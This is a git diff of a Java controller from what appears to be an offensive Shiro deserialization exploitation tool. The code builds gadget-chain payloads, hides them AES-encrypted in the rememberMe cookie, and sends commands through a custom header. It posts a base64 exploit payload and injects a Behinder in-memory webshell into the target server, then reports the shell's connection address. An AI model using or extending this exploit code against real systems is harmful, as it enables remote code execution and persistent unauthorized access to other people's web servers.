@@ -3,7 +3,6 @@ package cn.safe6.controller;
 import cn.safe6.core.Constants;
 import cn.safe6.core.ControllersFactory;
 import cn.safe6.core.http.Request;
-import cn.safe6.core.http.Response;
 import cn.safe6.core.jobs.BurstJob;
 import cn.safe6.payload.memshell.Loader;
 import cn.safe6.util.*;
@@ -259,7 +258,7 @@ public class Controller {
     }
 
     @FXML
-    public void execCmd(ActionEvent actionEvent) throws IOException {
+    public void execCmd(ActionEvent actionEvent) {
         try {
             Platform.runLater(() -> execCmd.setDisable(true));
             Thread.sleep(50);
@@ -284,15 +283,21 @@ public class Controller {
             String rmeValue = paramsContext.get("rmeValue").toString();
             Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");
 
+
+
             //利用链
             Class clazz = Class.forName(Constants.PAYLOAD_PACK + gadgetName);
             //rce回显
             Class clazz1 = Class.forName(Constants.PAYLOAD_PACK + echoType.getValue().toString());
-            Method getPayloadMethod = clazz.getMethod("getPayload", byte[].class);
 
-            byte[] payload = (byte[]) getPayloadMethod.invoke(null, clazz1.getMethod("getPayload").invoke(clazz1));
+            //真实payload
+            byte[] expPayload = (byte[]) clazz1.getMethod("getPayload").invoke(clazz1);
 
-            System.out.println("payloadLen:"+payload.length);
+            // loader
+            byte[] loader = Loader.getPayload();
+            Method mtd = clazz.getMethod("getPayload", byte[].class);
+            byte[] payload = (byte[]) mtd.invoke(null, loader);
+
 
             Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);
             String encryptData;
@@ -301,23 +306,32 @@ public class Controller {
             } else {
                 encryptData = PayloadEncryptTool.AesCbcEncrypt(payload, key);
             }
-            // = PayloadEncryptTool.AesGcmEncrypt(payload,key);
             String data;
-
             //请求包header超过8k会报header too large错误
             header.put("cookie", rmeValue + "=" + encryptData);
             header.put("s6", cmd1);
+            params.put("fuck",Base64.getEncoder().encodeToString(expPayload));
             if (isShowPayload.isSelected()) {
                 //System.out.println(""+Controller.logUtil.getLog().getCaretPosition());
                 Controller.logUtil.printData(header.toString());
             }
 
-            if (method.equals(Constants.METHOD_GET)) {
-                // data = HttpClientUtil.httpGetRequest(url, header);
-                data = HttpTool.get(url, header);
-            } else {
-                data = HttpClientUtil.httpPostRequest(url, header, params);
-            }
+//            if (method.equals(Constants.METHOD_GET)) {
+//                // data = HttpClientUtil.httpGetRequest(url, header);
+//                for (String s : params.keySet()) {
+//                    if (url.contains("?")){
+//                        url=url+"&"+s+"="+params.get(s);
+//                    }else {
+//                        url=url+"?"+s+"="+params.get(s);
+//                    }
+//                }
+//                //System.out.println(url);
+//                data = HttpTool.get(url, header);
+//            } else {
+//                data = HttpClientUtil.httpPostRequest(url, header, params);
+//            }
+            //利用可以全程用post，哪怕目标url不支持，因为只要反序列化成功，就能接收到参数
+            data = HttpClientUtil.httpPostRequest(url, header, params);
             if (data != null) {
                 if (data.contains("$$")) {
                     log.setText("");
@@ -366,17 +380,16 @@ public class Controller {
             }
 
             String gadgetName = gadget.getValue().toString();
-            String shell = shellType.getValue().toString();
+            String shellName = shellType.getValue().toString();
             String url = paramsContext.get("url").toString();
-            String method = paramsContext.get("method").toString();
+            //String method = paramsContext.get("method").toString();
             String rmeValue = paramsContext.get("rmeValue").toString();
             Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");
 
-            byte[] behinderLoaderBytes = Loader.getPayload();
-            //把待执行的类，塞进cc链
+            byte[] loader = Loader.getPayload();
             Class clazz = Class.forName(Constants.PAYLOAD_PACK + gadgetName);
             Method mtd = clazz.getMethod("getPayload", byte[].class);
-            byte[] payload = (byte[]) mtd.invoke(null, behinderLoaderBytes);
+            byte[] payload = (byte[]) mtd.invoke(null, loader);
 
             //获取一个可用的header
             Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);
@@ -388,8 +401,9 @@ public class Controller {
                 encryptData = PayloadEncryptTool.AesCbcEncrypt(payload, key);
             }
 
+
             //解决长度问题，把大payload放post包提交
-            Class clazz1 = Class.forName(Constants.SHELL_PACK + shell);
+            Class clazz1 = Class.forName(Constants.SHELL_PACK + shellName);
             Method mtd1 = clazz1.getMethod("getMemBehinder3Payload", String.class,String.class);
             params = new HashMap<>();
             //冰蝎内存马需要用到pageContext
@@ -410,13 +424,6 @@ public class Controller {
             //只能用post进行注入，get参数太长报错400
             String ss= HttpClientUtil.httpPostRequest(url, header, params);
             //String ss =HttpTool.post(url,postData,header);
-
-            //暂时写死
-            //url = url+"?test=ok";
-            logUtil.printInfoLog("开始检查注入状态",true);
-            Response response = HttpTool.get1(url);
-            //String data = response.getData();
-            String header1 = response.getHeader().toString();
             if (ss.contains("inject success")) {
                 logUtil.printSucceedLog("内存马注入成功！");
                 logUtil.printSucceedLog("连接地址:  "+url+path1);
@@ -497,7 +504,7 @@ public class Controller {
             paramsContext.put("AES", Constants.AES_CBC);
         }
 
-
+        paramsContext.computeIfAbsent("params", k -> new HashMap<String, Object>());
     }
 
 
